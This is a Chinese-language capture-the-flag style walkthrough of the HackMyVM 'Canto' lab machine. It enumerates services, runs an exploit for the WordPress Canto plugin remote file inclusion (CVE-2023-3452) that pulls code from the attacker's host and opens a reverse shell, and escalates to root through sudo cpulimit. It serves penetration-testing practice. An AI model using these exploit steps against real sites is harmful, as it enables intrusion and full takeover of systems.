# hmv_canto

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=canto
**难度**：绿色
**目标 IP**：192.168.205.213
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
Nmap scan report for 192.168.205.213
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds

```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。

---

### **2. Web 服务探测与Wordpress Plugin Canto远程执行漏洞**

对 80 端口感兴趣，访问 Web 页面，扫描一下结构

```bash
┌──(kali㉿kali)-[~]
└─$ whatweb http://192.168.205.213        
http://192.168.205.213 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.213], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[Canto], UncommonHeaders[link], WordPress[6.7.1]
                                                                                                
```

是WordPress，wpscan启动

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.205.213 -e vp,u --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.213/ [192.168.205.213]
[+] Started: Sun Dec 29 19:08:22 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.213/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.213/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.205.213/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.213/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.205.213/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://192.168.205.213/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.205.213/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://192.168.205.213/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=========================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.205.213/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Sun Dec 29 19:08:28 2024
[+] Requests Done: 57
[+] Cached Requests: 6
[+] Data Sent: 14.504 KB
[+] Data Received: 236.451 KB
[+] Memory used: 268.914 MB
[+] Elapsed time: 00:00:06
                                                    
```

然后我拿erik爆破了WordPress还爆破了ssh，都没有结果，回去看了眼网页发现他是WordPress，为什么起名Canto还写的有模样有的，我还以为是CMS呢，搜索了一下这个名字的漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Canto                  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)                                  | windows/dos/45095.py
Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                          | multiple/webapps/49189.txt
Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)         | php/webapps/51826.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                           
```

然后我发现这不会是个插件吧，用了一下php/webapps/51826.py，发现还真是

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit -m php/webapps/51826.py
  Exploit: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51826
     Path: /usr/share/exploitdb/exploits/php/webapps/51826.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (344)
Copied to: /home/kali/test/51826.py

┌──(kali㉿kali)-[~/test]
└─$ python3 51826.py          
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]
51826.py: error: the following arguments are required: -u/--url, -LHOST/--local_host
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]

Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Vulnerable URL
  -s SHELL, --shell SHELL
                        Local file for web shell
  -LHOST LOCAL_HOST, --local_host LOCAL_HOST
                        Local web server IP
  -LPORT LOCAL_PORT, --local_port LOCAL_PORT
                        Local web server port
  -c COMMAND, --command COMMAND
                        Command to execute on the target
  -NC_PORT NC_PORT, --nc_port NC_PORT
                        Listener port for netcat

    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33

    - Execute a command
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
  
                                                                                              
┌──(kali㉿kali)-[~/test]
└─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141           
Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&cmd=whoami
Local web server on port 8080...
192.168.205.213 - - [29/Dec/2024 19:37:27] "GET /wp-admin/admin.php HTTP/1.1" 200 -
Server response:
www-data
```

后面就按照提示使用脚本就好了

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141 -s index.php
Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&cmd=whoami
invalid local port None
Local web server on port 8080...
192.168.205.213 - - [29/Dec/2024 19:25:16] "GET /wp-admin/admin.php HTTP/1.1" 200 -

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                           
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.213] 57360
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 11:24:29 up 20 min,  0 user,  load average: 0.25, 2.51, 3.83
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功弹了回来

### 3.**获得稳定 shell**

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

### 4.**提权**

```bash
www-data@canto:/home$ ls -al
total 12
drwxr-xr-x  3 root root     4096 May 12  2024 .
drwxr-xr-x 20 root root     4096 May 12  2024 ..
drwxr-xr--  5 erik www-data 4096 May 12  2024 erik

```

发现我有erik的访问权限，进去溜达了一下

```bash
www-data@canto:/home/erik$ ls -al
total 36
drwxr-xr-- 5 erik www-data 4096 May 12  2024 .
drwxr-xr-x 3 root root     4096 May 12  2024 ..
lrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -> /dev/null
-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
drwx------ 2 erik erik     4096 May 12  2024 .cache
drwxrwxr-x 3 erik erik     4096 May 12  2024 .local
-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
drwxrwxr-x 2 erik erik     4096 May 12  2024 notes
-rw-r----- 1 root erik       33 May 12  2024 user.txt
www-data@canto:/home/erik$ cd notes/
www-data@canto:/home/erik/notes$ ls -al
total 16
drwxrwxr-x 2 erik erik     4096 May 12  2024 .
drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
www-data@canto:/home/erik/notes$ cat Day
cat: Day: No such file or directory
www-data@canto:/home/erik/notes$ cat Day1.txt 
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt 
I almost lost the database with my user so I created a backups folder.


翻译：

Day1.txt

第一天我更新了一些插件和网站主题。

Day2.txt

我差点丢失了用户的数据库，所以我创建了一个备份文件夹。
```

备份文件夹我很感兴趣，通常关于网站的应该都在`/var/www/`里

```bash
www-data@canto:/var/www$ ls -al
total 16
drwxr-xr-x  3 www-data www-data 4096 May 12  2024 .
drwxr-xr-x 15 root     root     4096 May 12  2024 ..
-rw-------  1 www-data www-data  219 May 12  2024 .bash_history
drwxr-xr-x  5 www-data www-data 4096 Dec 29 11:05 html
www-data@canto:/var/www$ cat .bash_history
cd /var/wordpress
cd /var
cd /wordpress
export TERM=xterm
clear
ls
cd wordpress
cd wordpres
ls
cd backups
ls
clear
ls
ls -la
unzip dbbackup.zip
ls
clear
ls -la
su erik
cd /var/wordpress/backups
ls
cat 12052024.txt
exit

```

有个`.bash_history`，答案显而易见了`/var/wordpress/backups/12052024.txt`，成功登录erik用户,`sudo -l`一下

```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit

```

[cpulimit sudo 提权方法](https://gtfobins.github.io/gtfobins/cpulimit/#sudo)

```bash
erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
Process 2669 detected
# id
uid=0(root) gid=0(root) groups=0(root)
```